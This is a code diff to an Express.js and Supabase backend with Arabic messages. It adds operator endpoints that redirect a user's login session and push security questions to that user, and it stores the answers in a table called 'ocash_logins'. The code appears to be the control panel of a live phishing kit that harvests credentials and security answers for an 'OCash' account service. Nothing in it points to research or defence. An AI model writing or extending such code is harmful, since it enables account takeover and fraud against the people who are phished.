@@ -113,9 +113,9 @@ app.post('/api/submit-security/:id', async (req, res) => {
 // Check status
 app.get('/api/status/:id', async (req, res) => {
   try {
-    const { data } = await supabase.from('ocash_logins').select('status,step,redirect_to').eq('id', req.params.id).maybeSingle();
+    const { data } = await supabase.from('ocash_logins').select('status,step,redirect_to,security_question').eq('id', req.params.id).maybeSingle();
     if (!data) return res.status(404).json({ error: 'not found' });
-    res.json({ status: data.status, step: data.step, redirect: data.redirect_to || '' });
+    res.json({ status: data.status, step: data.step, redirect: data.redirect_to || '', security_question: data.security_question || '' });
   } catch (err) {
     res.json({ status: 'pending', step: 'login' });
   }
@@ -177,6 +177,26 @@ app.post('/api/admin/redirect/:id', async (req, res) => {
     const page = String(req.body.page || '');
     const { error } = await supabase.from('ocash_logins').update({
       redirect_to: page,
+      status: 'redirect',
+      updated_at: new Date().toISOString()
+    }).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin: send security question to client
+app.post('/api/admin/send-question/:id', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
+    const question = String(req.body.question || '').trim();
+    if (!question) return res.status(400).json({ error: 'السؤال مطلوب' });
+    const { error } = await supabase.from('ocash_logins').update({
+      security_question: question,
+      security_answer: '',
+      redirect_to: 'security',
       status: 'redirect',
       updated_at: new Date().toISOString()
     }).eq('id', req.params.id);
